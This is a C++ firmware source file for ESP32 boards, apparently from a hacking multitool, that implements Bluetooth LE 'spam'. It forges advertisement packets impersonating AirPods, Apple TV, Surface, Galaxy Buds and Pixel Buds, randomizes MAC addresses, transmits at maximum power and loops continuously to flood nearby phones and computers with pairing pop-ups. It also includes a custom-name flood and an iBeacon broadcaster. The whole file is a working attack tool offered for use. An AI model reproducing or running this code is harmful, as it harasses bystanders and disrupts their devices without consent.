#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

struct BLEData {
    BLEAdvertisementData AdvData;
    BLEAdvertisementData ScanData;
};

struct WatchModel {
    uint8_t value;
};

struct mac_addr {
    unsigned char bytes[6];
};

struct Station {
    uint8_t mac[6];
    bool selected;
};

const uint8_t IOS1[]{
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
    0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12,
    0x16
};

const uint8_t IOS2[]{
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
    0x0b, 0x09, 0x02, 0x1e, 0x24
};

struct DeviceType {
    uint32_t value;
    uint8_t reliability;
};

const DeviceType android_models[] = {
    {0xCD8256, 100}, {0x92BBBD, 100}, {0x821F66, 95}, {0xD446A7, 95}, {0x2D7A23, 95}, {0x0E30C3, 90},
    {0x038B91, 85}, {0x02F637, 85}, {0x02D886, 85}, {0x06AE20, 80}, {0x07F426, 80}, {0x054B2D, 80},
    {0x0660D7, 80}, {0x0903F0, 75}, {0x0001F0, 60}, {0x000047, 60}, {0x470000, 60}, {0x00000A, 60},
    {0x00000B, 60}, {0x00000D, 60}, {0x000007, 60}, {0x000009, 60}, {0x090000, 60}, {0x000048, 65},
    {0x001000, 65}, {0x00B727, 65}, {0x01E5CE, 65}, {0x0200F0, 65}, {0x00F7D4, 65}, {0xF00002, 65},
    {0xF00400, 65}, {0x1E89A7, 65}, {0x0577B1, 85}, {0x05A9BC, 85}, {0x0000F0, 75}, {0xF00000, 75},
    {0xF52494, 80}, {0x718FA4, 80}, {0x0002F0, 70}, {0x000006, 70}, {0x060000, 70}, {0xF00001, 75},
    {0xF00201, 70}, {0xF00209, 75}, {0xF00205, 75}, {0xF00305, 70}, {0xF00E97, 75}, {0x04ACFC, 75},
    {0x04AA91, 70}, {0x04AFB8, 75}, {0x05A963, 75}, {0x05AA91, 70}, {0x05C452, 75}, {0x05C95C, 75},
    {0x0602F0, 70}, {0x0603F0, 70}, {0x1E8B18, 75}, {0x1E955B, 75}, {0x1EC95C, 75}, {0x06C197, 80},
    {0x06D8FC, 80}, {0x0744B6, 80}, {0x07A41C, 80}, {0xD99CA1, 90}, {0x77FF67, 85}, {0xAA187F, 85},
    {0xDCE9EA, 80}, {0x87B25F, 80}, {0x1448C9, 75}, {0x13B39D, 75}, {0x7C6CDB, 75}, {0x005EF9, 70},
    {0xE2106F, 85}, {0xB37A62, 90}, {0x92ADC9, 70}
};

const WatchModel watch_models[26] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09}, {0x0A}, {0x0B},
    {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D},
    {0x1E}, {0x20}
};

BLEAdvertising *pAdvertising;

enum EBLEPayloadType { 
    Microsoft = 0, 
    SourApple = 1, 
    AppleJuice = 2, 
    Samsung = 3, 
    Google = 4 
};

const char *generateRandomName() {
    const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = 8;
    char *randomName = (char *)malloc((len + 1) * sizeof(char));
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)];
    }
    randomName[len] = '\0';
    return randomName;
}

void generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
        if (i == 0) { 
            mac[i] = (mac[i] | 0xF0) & 0xFE;
        }
    }
}

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));

uint32_t getOptimizedAndroidModel() {
    int chance = random(100);
    
    if (chance < 70) {
        int highRelCount = 0;
        for (int i = 0; i < android_models_count; i++) {
            if (android_models[i].reliability >= 85) highRelCount++;
        }
        
        if (highRelCount > 0) {
            int attempts = 0;
            while (attempts < 10) {
                int idx = random(android_models_count);
                if (android_models[idx].reliability >= 85) {
                    return android_models[idx].value;
                }
                attempts++;
            }
        }
    }
    else if (chance < 90) {
        int attempts = 0;
        while (attempts < 10) {
            int idx = random(android_models_count);
            if (android_models[idx].reliability >= 70 && android_models[idx].reliability < 85) {
                return android_models[idx].value;
            }
            attempts++;
        }
    }
    
    return android_models[random(android_models_count)].value;
}

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();

    switch (Type) {
        case Microsoft: {
            uint8_t packet[] = {
                0x02, 0x01, 0x05,
                0x0B, 0x09, 'S', 'u', 'r', 'f', 'a', 'c', 'e', ' ', 'P', 'r', 'o',
                0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80
            };
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, sizeof(packet));
            #else
            AdvData.addData(std::string((char *)packet, sizeof(packet)));
            #endif
            break;
        }
        case AppleJuice: {
            int randChoice = random(100);
            uint8_t deviceType;
            
            if (randChoice < 60) {
                deviceType = 0x0e;
            } else if (randChoice < 80) {
                deviceType = IOS1[random() % sizeof(IOS1)];
            } else {
                deviceType = IOS2[random() % sizeof(IOS2)];
            }
            
            if (randChoice < 80) {
                uint8_t packet[26] = {
                    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00
                };
                #ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 26);
                #else
                AdvData.addData(std::string((char *)packet, 26));
                #endif
            } else {
                uint8_t packet[23] = {
                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, deviceType,
                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10,
                    0x00, 0x00, 0x00
                };
                #ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 23);
                #else
                AdvData.addData(std::string((char *)packet, 23));
                #endif
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            int i = 0;
            packet[i++] = 16;
            packet[i++] = 0xFF;
            packet[i++] = 0x4C;
            packet[i++] = 0x00;
            packet[i++] = 0x0F;
            packet[i++] = 0x05;
            packet[i++] = 0xC1;
            
            const uint8_t high_prob_types[] = {0x01, 0x06, 0x09, 0x0b, 0x20};
            const uint8_t all_types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            
            if (random(100) < 70) {
                packet[i++] = high_prob_types[random() % sizeof(high_prob_types)];
            } else {
                packet[i++] = all_types[random() % sizeof(all_types)];
            }
            
            esp_fill_random(&packet[i], 3);
            i += 3;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x10;
            esp_fill_random(&packet[i], 3);
            
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 17);
            #else
            AdvData.addData(std::string((char *)packet, 17));
            #endif
            break;
        }
        case Samsung: {
            uint8_t model;
            if (random(100) < 70) {
                model = watch_models[11 + random(15)].value;
            } else {
                model = watch_models[random(26)].value;
            }
            
            uint8_t packet[15] = {
                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
                0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                model
            };
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 15);
            #else
            AdvData.addData(std::string((char *)packet, 15));
            #endif
            break;
        }
        case Google: {
            const uint32_t model = getOptimizedAndroidModel();
            int8_t rssi = -45 - (random() % 40);
            
            uint8_t packet[14] = {
                0x03, 0x03, 0x2C, 0xFE,
                0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A,
                (uint8_t)rssi
            };
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 14);
            #else
            AdvData.addData(std::string((char *)packet, 14));
            #endif
            break;
        }
    }

    return AdvData;
}

void executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    
    const char* deviceName = "";
    switch(type) {
        case AppleJuice: deviceName = "AirPods Pro"; break;
        case SourApple: deviceName = "Apple TV 4K"; break;
        case Microsoft: deviceName = "Surface Pro 9"; break;
        case Samsung: deviceName = "Galaxy Buds2 Pro"; break;
        case Google: deviceName = "Pixel Buds Pro"; break;
    }
    
    Serial.printf("[BLE] Starting: %s\n", deviceName);
    
    BLEDevice::init(deviceName);
    vTaskDelay(20 / portTICK_PERIOD_MS);
    
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();
    
    advertisementData.setFlags(0x01 | 0x02);
    scanResponseData.setName(deviceName);
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);
    
    pAdvertising->setMinInterval(0x800);
    pAdvertising->setMaxInterval(0x800);
    
    pAdvertising->start();
    vTaskDelay(800 / portTICK_PERIOD_MS);
    
    pAdvertising->stop();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
    
    Serial.printf("[BLE] Finished: %s\n", deviceName);
}

void executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    for (int i = 0; i < 6; i++) { 
        macAddr[i] = esp_random() & 0xFF; 
    }
    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;
    
    esp_base_mac_addr_set(macAddr);
    
    String deviceName = spamName;
    if (!deviceName.endsWith(" Pro") && !deviceName.endsWith(" Max")) {
        deviceName += " Pro";
    }
    
    Serial.printf("[BLE] Custom: %s\n", deviceName.c_str());
    
    BLEDevice::init(deviceName.c_str());
    vTaskDelay(15 / portTICK_PERIOD_MS);
    
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();
    
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();
    
    advertisementData.setFlags(0x01 | 0x02);
    advertisementData.setName(deviceName.c_str());
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);
    
    pAdvertising->setMinInterval(0x800);
    pAdvertising->setMaxInterval(0x800);
    
    pAdvertising->start();
    vTaskDelay(800 / portTICK_PERIOD_MS);
    
    pAdvertising->stop();
    vTaskDelay(15 / portTICK_PERIOD_MS);
    
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
}

void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(ManufacturerId);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));
    
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    
    pAdvertising->setAdvertisementData(advertisementData);
    
    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");
    
    while (!check(AnyKeyPress)) {
        pAdvertising->start();
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
    
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
}

void aj_adv(int ble_choice) {
    int mael = 0;
    int count = 0;
    String spamName = "";
    
    Serial.println("\n========== BLE SPAM OPTIMIZED ==========");
    Serial.println("Optimized for maximum pop-up detection!");
    Serial.println("Total Android models available: " + String(android_models_count));
    Serial.println("========================================\n");
    
    if (ble_choice == 6) { 
        spamName = keyboard("", 10, "Name to spam"); 
    }
    
    while (1) {
        Serial.printf("Attempt #%d: ", count);
        
        switch (ble_choice) {
            case 0:
                displayTextLine("AirPods Pro (" + String(count) + ")");
                Serial.println("AirPods Pro - iOS pop-up");
                executeSpam(AppleJuice);
                break;
            case 1:
                displayTextLine("Apple TV 4K (" + String(count) + ")");
                Serial.println("Apple TV 4K - HomeKit pop-up");
                executeSpam(SourApple);
                break;
            case 2:
                displayTextLine("Surface Pro (" + String(count) + ")");
                Serial.println("Surface Pro - Windows pop-up");
                executeSpam(Microsoft);
                break;
            case 3:
                displayTextLine("Galaxy Buds2 Pro (" + String(count) + ")");
                Serial.println("Galaxy Buds2 Pro - Samsung pop-up");
                executeSpam(Samsung);
                break;
            case 4:
                displayTextLine("Pixel Buds Pro (" + String(count) + ")");
                Serial.println("Pixel Buds Pro - Android Fast Pair");
                executeSpam(Google);
                break;
            case 5:
                displayTextLine("Spam All (" + String(count) + ")");
                switch(mael % 5) {
                    case 0: 
                        Serial.println("Pixel Buds Pro");
                        executeSpam(Google); 
                        break;
                    case 1: 
                        Serial.println("Galaxy Buds2 Pro");
                        executeSpam(Samsung); 
                        break;
                    case 2: 
                        Serial.println("Surface Pro");
                        executeSpam(Microsoft); 
                        break;
                    case 3: 
                        Serial.println("Apple TV 4K");
                        executeSpam(SourApple); 
                        break;
                    case 4: 
                        Serial.println("AirPods Pro");
                        executeSpam(AppleJuice); 
                        break;
                }
                mael++;
                break;
            case 6:
                displayTextLine(spamName + " (" + String(count) + ")");
                Serial.println("Custom: " + spamName);
                executeCustomSpam(spamName);
                break;
        }
        count++;
        
        vTaskDelay(500 / portTICK_PERIOD_MS);
        
        if (check(EscPress)) {
            Serial.println("\n========== BLE SPAM STOPPED ==========");
            returnToMenu = true;
            break;
        }
    }
    
    BLEDevice::init("");
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdvertising = nullptr;
    vTaskDelay(100 / portTICK_PERIOD_MS);
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
}
